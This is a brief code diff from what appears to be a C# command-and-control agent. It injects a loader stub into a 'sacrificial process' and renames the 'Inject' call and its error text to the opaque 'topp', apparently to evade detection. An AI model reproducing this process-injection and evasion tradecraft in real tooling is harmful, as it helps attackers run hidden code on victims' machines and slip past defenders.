@@ -212,9 +212,9 @@ namespace Tasks
                     )
                 );
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
-                if (!proc.Inject(exePEPic))
+                if (!proc.topp(exePEPic))
                 {
-                    throw new Exception($"Failed to inject loader into sacrificial process {info.Application}.");
+                    throw new Exception($"Failed to topp loader into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(
